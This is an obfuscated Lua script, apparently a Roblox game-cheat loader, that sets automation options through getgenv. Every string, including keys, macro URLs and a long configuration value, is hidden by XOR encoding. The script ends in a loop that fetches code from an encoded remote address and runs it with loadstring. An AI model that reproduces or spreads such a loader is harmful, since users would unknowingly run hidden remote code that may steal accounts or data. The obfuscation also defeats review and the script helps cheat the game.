local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v15,v16) local v17={};for v19=1, #v15 do v6(v17,v0(v4(v1(v2(v15,v19,v19 + 1 )),v1(v2(v16,1 + (v19% #v16) ,1 + (v19% #v16) + 1 )))%256 ));end return v5(v17);end getgenv().Key=v7("\218\198\140\119\180\189\198\27\130\146\130\33\190\184\159\29\208\155\142\124\179\227\145\76","\126\177\163\187\69\134\219\167");getgenv().ImportMacro={v7("\43\217\62\213\239\121\130\101\205\243\33\200\37\214\255\49\196\58\209\178\32\194\39\138\238\34\218\100\196\249\55\197\47\215\234\42\193\38\196\251\38\131\62\221\232","\156\67\173\74\165"),v7("\60\163\93\6\175\124\9\123\191\70\20\185\41\85\55\165\64\6\168\104\69\59\186\6\4\189\49\8\53\178\93\30\185\52\75\59\181\7\2\164\50","\38\84\215\41\118\220\70"),v7("\88\2\54\2\237\10\89\109\26\241\82\19\45\1\253\66\31\50\6\176\83\25\47\93\236\81\1\108\19\251\68\30\39\0\253\69\4\49\23\250\30\2\58\6","\158\48\118\66\114"),v7("\163\48\4\38\96\255\180\228\44\31\52\118\170\232\168\54\25\38\103\235\248\164\41\95\36\114\178\181\170\33\4\62\118\183\249\167\49\21\120\103\189\239","\155\203\68\112\86\19\197"),v7("\78\201\34\236\83\34\170\183\78\210\52\249\79\107\230\234\79\205\34\178\67\119\232\183\84\220\33\178\65\125\241\240\67\207\34\249\77\104\233\253\8\201\46\232","\152\38\189\86\156\32\24\133"),v7("\244\67\179\86\239\13\232\9\244\88\165\67\243\68\164\84\245\71\179\8\255\88\170\9\238\86\176\8\253\82\179\78\249\69\163\73\246\88\233\82\228\67","\38\156\55\199"),v7("\160\105\104\56\0\46\181\12\160\114\126\45\28\103\249\81\161\109\104\102\16\123\247\12\186\124\107\102\18\113\238\75\173\111\107\39\28\112\233\13\188\101\104","\35\200\29\28\72\115\20\154"),v7("\17\171\197\207\158\118\123\86\183\222\221\136\35\39\26\173\216\207\153\98\55\22\178\158\205\140\59\122\24\186\197\215\136\62\38\24\182\213\141\195\56\44\13","\84\121\223\177\191\237\76"),v7("\179\66\221\176\41\10\127\142\179\89\203\165\53\67\51\211\178\70\221\238\57\95\61\142\169\87\222\238\40\81\57\197\234\24\221\184\46","\161\219\54\169\192\90\48\80"),v7("\65\86\20\53\90\24\79\106\65\77\2\32\70\81\3\55\64\82\20\107\74\77\13\106\91\67\23\107\72\71\20\45\76\80\3\36\95\71\78\49\81\86","\69\41\34\96"),v7("\180\215\195\26\17\113\243\140\223\5\0\46\179\208\212\24\11\59\168\141\212\5\15\100\174\194\192\68\14\62\178\194\197\68\22\51\168","\75\220\163\183\106\98"),v7("\10\174\159\39\202\88\245\196\63\214\0\191\132\36\218\16\179\155\35\151\1\181\134\120\203\3\173\197\36\214\14\187\153\121\205\26\174","\185\98\218\235\87"),v7("\195\40\51\246\205\240\132\115\47\233\220\175\196\47\36\244\215\186\223\114\36\233\211\229\217\61\48\168\205\165\199\61\53\235\199\190\195\53\36\168\202\178\223","\202\171\92\71\134\190")};getgenv().EquipMacroUnit=true;getgenv().LockAllEquippedUnit=false;getgenv().AutoSelectRoll=v7("\14\211\45\134\45\129\13\141\61\201\41\154\105\234\34\129\46\201\56","\232\73\161\76");getgenv().AutoSpiritSummon=true;getgenv().Config={[v7("\154\204\86\82\45\186\207\71","\126\219\185\34\61")]=true,[v7("\45\219\74\125\84\120\250\233\60\193\76\102\127\123","\135\108\174\62\18\30\23\147")]=true,[v7("\133\236\62\211\74\137\50\202\179\218\58\206\29\170","\167\214\137\74\171\120\206\83")]=true,[v7("\190\254\33\88\244\162\136\228\27\91\203\178\134\253\61\83\253\163","\199\235\144\82\61\152")]=true,[v7("\46\2\188\38\55\4\176\40\2","\75\103\118\217")]=1 -0 ,[v7("\240\124\79\57\184\10\196\92\83\27\180\14\203\81\100\17","\126\167\52\16\116\217")]=true,[v7("\233\59\52\143\129\10\249\228\59\35\139\132\22\232\193\33\46","\156\168\78\64\224\212\121")]=true,[v7("\52\235\169\203\4\250\134\198\6\254\177\203\21","\174\103\142\197")]=v7("\127\38\89\49\43\87\236\83","\152\54\72\63\88\69\62"),[v7("\254\203\231\82\209\214\194\85\199\208","\60\180\164\142")]={[1]=v7("\118\81\69\35\40\228\28\93\76\69\32\41\173\6\80\91\69\37\46\254\6","\114\56\62\101\73\71\141")},[v7("\153\252\207\203\139\252\214\201\183\231\232\208\185\231\223\197\170\237","\164\216\137\187")]=true,[v7("\225\227\61\183\165\234\60\221\244\61\182","\107\178\134\81\210\198\158")]=v7("\15\7\140\194\167\49\2\142\134\156\49\2\142\199\173\61","\202\88\110\226\166"),[v7("\226\26\150\248\224\204\6\140\192\197\209\3\134","\170\163\111\226\151")]=true,[v7("\48\37\166\55\123\36\44\48\50\187\52\71\35\48","\73\113\80\210\88\46\87")]=true,[v7("\178\41\193\23\228\149\28\194\0\243\128\32\224\19\228\147\35","\135\225\76\173\114")]={[v7("\54\248\182\177\190\253\147\31\224\168\188\169\253\151\21\255\172\177\160","\199\122\141\216\208\204\221")]=v7("\128\220\19\226\119\161\253\252\19\228\113\249\163","\150\205\189\112\144\24"),[v7("\22\139\179\77\22\200\37\21\40\148\179\73\68\184\30\2\49\133\179","\112\69\228\223\44\100\232\113")]=v7("\249\30\4\193\185\45\214\141\62\4\199\191\115\136","\230\180\127\103\179\214\28")},[v7("\173\16\75\73\198\84\249\190\4\86\66","\128\236\101\63\38\132\33")]=true,[v7("\128\154\56\73\166\231\192\191\160\30\74","\175\204\201\113\36\214\139")]=100236 -(141 + 95) ,[v7("\116\201\57\217\7\83\232\48\208\1\83\201\28\200\1\74","\100\39\172\85\188")]={[v7("\129\109\183\129\33\237\93\170\147\54\163\123\188\192\22\181\108\171\129\48\185","\83\205\24\217\224")]=true,[v7("\213\202\193\60\244\133\232\46\245\192\195\62\227\133\232\37\242\215\204\62\242","\93\134\165\173")]=true},[v7("\152\247\196\198\22\203\164\123\178","\30\222\146\161\162\90\174\210")]=79 + 1 ,[v7("\214\75\124\15\230\90\66\11\236\74\71\5\247\66\116","\106\133\46\16")]={[v7("\123\53\97\239\95\68\24\20\97\253\83\78","\32\56\64\19\156\58")]=false,[v7("\121\221\247\69\95\246\192\126\221\235\81\95\253\142","\224\58\168\133\54\58\146")]=true},[v7("\106\66\74\243\113\135\149\15\106\67\70\240\122\136\178\5\80\66","\107\57\54\43\157\21\230\231")]={[v7("\235\130\31\254\249\248\202\214\132\31\181\142\213\219\216\131","\175\187\235\113\149\217\188")]=true},[v7("\16\170\128\90\230\74\125\48\163\182\77\245\124","\24\92\207\225\44\131\25")]=1841 -(573 + 1217) ,[v7("\124\214\186\68\20\114\64\230\138\96","\29\43\179\216\44\123")]=v7("\181\205\52\92\174\131\111\3\185\208\51\79\178\203\36\2\190\214\45\3\188\201\41\3\170\220\34\68\178\214\43\95\242\136\114\25\234\128\118\24\235\128\119\25\228\138\112\25\234\138\114\29\242\220\31\74\234\206\116\103\145\213\121\109\141\203\54\27\170\234\55\97\168\250\2\91\150\193\37\126\150\140\6\1\143\233\6\29\190\253\109\64\237\209\1\102\149\233\38\93\185\137\7\75\143\138\21\72\236\201\113\75\184\205\36\89\190\234\11\104\138","\44\221\185\64"),[v7("\51\226\89\74\122\19\226\76\120\118\12","\19\97\135\40\63")]=7722 -4722 ,[v7("\143\73\39\52\12\61\175\85\62\25\46\37\186\80\54\11\46\34\189","\81\206\60\83\91\79")]=true,[v7("\111\190\196\125\29\198\71\171\71\165","\196\46\203\176\18\79\163\45")]=true,[v7("\153\55\106\17\0\254\227\189\54\123\43\42\242\251","\143\216\66\30\126\68\155")]=false,[v7("\139\221\25\196\230\175\214\232\167\249\24\206\214\183","\129\202\168\109\171\165\195\183")]=true,[v7("\22\104\27\215\220\22\255\11\94\7\212\223\13\227\48","\134\66\56\87\184\190\116")]=true,[v7("\22\62\0\181\28\249\2\58\51\61\13\180\14\229","\85\92\81\105\219\121\139\65")]=36 -21 ,[v7("\212\180\94\74\110\218\208\178\83\87\115\235\244\190\89\75\123","\191\157\211\48\37\28")]=true,[v7("\236\26\248\25\57\203\50\245\31\40\208","\90\191\127\148\124")]=v7("\85\134\45\5\119\214\127\68\89\132\58\30\119\137","\119\24\231\78"),[v7("\177\40\169\79\223\84\35\131\36\161\103\221\67\3\141","\113\226\77\197\42\188\32")]={[v7("\25\3\230\166\63\18\180\129\40\23\253\187","\213\90\118\148")]=v7("\118\47\183\68\66\10\122\236\119\78\79\39\187\88","\45\59\78\212\54"),[v7("\51\67\145\152\131\42\237\212\5\88\132\142\137\32","\144\112\54\227\235\230\78\205")]=v7("\158\41\12\238\223\10\225\122\46\255\196\82\188\38","\59\211\72\111\156\176")},[v7("\111\146\247\34\100\136\234\35\124\134\234\41","\77\46\231\131")]=true,[v7("\137\81\186\69\185\64\129\79\168\88\178","\32\218\52\214")]=v7("\121\30\63\172\252\185\73\86\14\33\56\164\253\177\66\95","\58\46\119\81\200\145\208\37"),[v7("\27\128\49\181\132\188\53\57\131","\86\75\236\80\204\201\221")]=true,[v7("\65\68\123\128\253\159\66\78\101\145\255\135","\235\18\33\23\229\158")]={[v7("\124\175\207\186\66\250\241\180\66\174\192\183","\219\48\218\161")]=true,[v7("\215\126\112\72\201\15\208\235\99\104\72\215","\128\132\17\28\41\187\47")]=true},[v7("\32\39\18\53\121\4\62\3\46\88\40\38\3\55","\61\97\82\102\90")]=true,[v7("\153\32\162\95\247\69\23\10\169","\105\204\78\203\43\167\55\126")]=1 + 0 ,[v7("\132\191\55\17\32\15\206\65","\49\197\202\67\126\115\100\167")]=true,[v7("\22\121\253\1\143\70\122\50\87\222\48","\62\87\59\191\73\224\54")]=0 + 0 ,[v7("\212\7\246\204\228\22\201\217\238\16\243\221","\169\135\98\154")]={[v7("\238\118\54\64\245\115\251\219\126\54\93\233","\168\171\23\68\52\157\83")]=false,[v7("\192\99\224\168\101\30\151\253\99\252\185","\231\148\17\149\205\69\77")]=true,[v7("\179\179\200\233\90\191\179\183\206\233\94\235","\159\224\199\167\155\55")]=false,[v7("\196\242\63\192\242\247\124\225\231\250\46\219\227","\178\151\147\92")]=false,[v7("\168\244\90\59\28\73\58\191\237\69\32\27\88","\26\236\157\44\82\114\44")]=false,[v7("\14\47\199\80\106\29\197\82\56\39\193","\59\74\78\181")]=false,[v7("\0\223\89\82\178\43\197\95\94\243\22\193\83\72\186\49","\211\69\177\58\58")]=false,[v7("\144\234\117\241\236\197\247\214\105\252\251\194\163","\171\215\133\25\149\137")]=false,[v7("\194\218\43\233\251\49\240\2\210\216\59\232\230\36","\34\129\168\82\154\143\80\156")]=false,[v7("\164\160\48\10\70\75\201\182\162\58\25\65\90","\233\229\210\83\107\40\46")]=false,[v7("\236\75\32\196\10\211\2\1\198\12\211\75\38","\101\161\34\82\182")]=false,[v7("\196\4\94\246\207\162\177\62\225\31\80\234","\78\136\109\57\158\187\130\226")]=false,[v7("\25\62\245\240\61\43\240\242\126\12\233\248\44\54\237","\145\94\95\153")]=false,[v7("\222\223\29\216\93\184\243\141\39\197\71\165\244\217","\215\157\173\116\181\46")]=false,[v7("\28\183\142\178\233\37\189\153\251\206","\186\85\212\235\146")]=false,[v7("\228\136\4\251\121\221\72\203\147\31\234","\56\162\225\118\158\89\142")]=false},[v7("\111\0\204\170\33\204\127\13\193\191\54\221\78","\184\60\101\160\207\66")]=v7("\24\140\122\181\63\139\104\185","\220\81\226\28"),[v7("\63\230\160\244\231\197","\167\115\181\226\155\138")]=2 -1 ,[v7("\206\17\203\83\116\97","\166\130\66\135\60\27\17")]=2 + 0 ,[v7("\101\95\218\122\3\65\70\194\70\56\77\68\199\112\35","\80\36\42\174\21")]=true,[v7("\125\21\59\127\77\4\20\114\79\28\59\127\64\23\50\87\79\19\37\117","\26\46\112\87")]={[v7("\154\54\185\103\186\187\5\149\186\34\175\113\178\166","\212\217\67\203\20\223\223\37")]=v7("\151\140\171\192\181\219\252\243\185\153\161\221\180","\178\218\237\200"),[v7("\131\187\226\213\164\162\231\196\179\167\166\228\179\184\246\220\179","\176\214\213\134")]=v7("\217\172\181\198\167\0\10\213\174\162\221\167\88","\57\148\205\214\180\200\54"),[v7("\48\241\32\49\54\34\241\52\58\115\6","\22\114\157\85\84")]=v7("\233\202\16\214\82\174\248\229\200\7\205\82\248","\200\164\171\115\164\61\150"),[v7("\141\250\12\82\154\254\195\12\74\135\173","\227\222\148\99\37")]=v7("\30\83\81\228\246\100\5\115\245\237\58\93\92","\153\83\50\50\150"),[v7("\126\100\106\15\103\170\65\29\85\114\10\118","\45\61\22\19\124\19\203")]=v7("\236\19\14\231\13\40\238\224\17\25\252\13\126","\217\161\114\109\149\98\16"),[v7("\33\55\55\110\184\103\31\33\54\60\152\123\24\47","\20\114\64\88\28\220")]=v7("\28\0\209\166\247\135\232\16\2\198\189\247\222","\221\81\97\178\212\152\176"),[v7("\229\230\8\245\14\200\227\93\216\19\217\254","\122\173\135\125\155")]=v7("\169\192\3\171\48\100\152\165\194\20\176\48\63","\168\228\161\96\217\95\81"),[v7("\236\216\32\88\34\94\215\221\110\106\38\91\215\208\41\89","\55\187\177\78\60\79")]=v7("\0\207\92\249\73\158\209\126\239\92\255\79\192\142","\224\77\174\63\139\38\175")},[v7("\180\78\74\58\133\77\106\47\150\72\76\55","\78\228\33\56")]={[v7("\226\123\181\6\139\202\127\160\26","\229\174\30\210\99")]=true,[v7("\41\236\148\84","\89\123\141\230\49\141\93")]=true,[v7("\222\104\226\4\25\73","\42\147\17\150\108\112")]=false,[v7("\42\182\36\124","\136\111\198\77\31\135")]=true},[v7("\46\58\131\83\177\229\14","\201\98\105\199\54\221\132\119")]=0.4 + 0 ,[v7("\152\25\151\46\48\48\184\172\30\141\13\13\55\174\160","\204\217\108\227\65\98\85")]=true,[v7("\105\235\202\199\45\206\80\198\231\214\57\205\83\204\251\224\40","\160\62\163\149\133\76")]=true,[v7("\229\165\1\42\192\194\130\24\54\241\215\169\9","\163\182\192\109\79")]={[v7("\6\39\9\196\164","\149\84\70\96\160")]={[v7("\12\20\12\228\44\70\46\255\33\21\25\236\52","\141\88\102\109")]=true,[v7("\129\90\217\123\3\125\113\200\176\86","\161\211\51\170\16\122\93\53")]=false,[v7("\221\188\189\59\239\238\144\33\245\170","\72\155\206\210")]=true,[v7("\97\127\89\29","\83\38\26\52\110")]=false,[v7("\122\18\38\84\24\60\46\72\95","\38\56\119\71")]=false,[v7("\220\251\80\211\55\65\252\253\84\210\41\79\179\200\89\195\43\66\255\234\76","\54\147\143\56\182\69")]=false},[v7("\228\128\246\77\141","\191\182\225\159\41")]={[v7("\31\0\41\92\159\199\225\57\11\59\65\138\139","\162\75\114\72\53\235\231")]=true,[v7("\190\53\87\233\74\66\168\53\71\231","\98\236\92\36\130\51")]=false,[v7("\147\24\24\191\87\232\134\39\171\11\8\169\72\169\166\36\161\11","\80\196\121\108\218\37\200\213")]=false,[v7("\39\118\15\108","\234\96\19\98\31\43\110")]=false,[v7("\39\14\71\198\236\80\135\7\27\87","\235\102\127\50\167\204\18")]=false,[v7("\118\179\250\48\80\110\114\168\251\39","\78\48\193\149\67\36")]=true}},[v7("\3\27\140\29\66\36\58\133\20\68\36\27\178\25\83\57\10\153","\33\80\126\224\120")]={[v7("\223\160\10\202\69\172\133\26\208\84\229\171","\60\140\200\99\164")]=false,[v7("\170\237\16\46\171\132","\194\231\148\100\70")]=true,[v7("\106\73\198\166\248\204\71\94\216","\168\38\44\161\195\150")]=true,[v7("\179\244\139\120\41\168\147\6\137\255","\118\224\156\226\22\80\136\214")]=true,[v7("\103\254\80\131","\224\34\142\57")]=true,[v7("\237\175\204\211\106\177\111\15\204\162","\110\190\199\165\189\19\145\61")]=true,[v7("\233\227\126\230\146\135\246\238\112\237\133\195\219\249\110","\167\186\139\23\136\235")]=true,[v7("\40\180\154\8","\109\122\213\232")]=true},[v7("\207\226\182\63\200\242\167\52\203\230\183\57\254\231\167\52\219\249\171\36","\80\142\151\194")]=true,[v7("\33\201\120\95\23\224\71\127","\44\99\166\23")]=true,[v7("\88\242\37\51\39\161\78\246\59\63\39\189","\196\28\151\73\86\83")]={[v7("\214\19\32\19","\22\147\99\73\112\226\56\120")]=true,[v7("\148\112\229\240\131\188\116\240\236","\237\216\21\130\149")]=true,[v7("\176\79\77\90","\62\226\46\63\63\208\169")]=true},[v7("\196\12\65\140\51\8\46\72\224","\62\133\121\53\227\127\109\79")]=true};repeat local v18=0 -0 ;while true do if (v18==(2 -1)) then wait(6 + 4 );break;end if (v18==(0 -0)) then wait();spawn(function() loadstring(game:HttpGet(v7("\24\0\38\229\197\244\237\95\26\61\224\197\167\165\25\90\49\250\219\225\174\31\21\54\240\196\224\174\5\21","\194\112\116\82\149\182\206")))();end);v18=1 + 0 ;end end until Joebiden
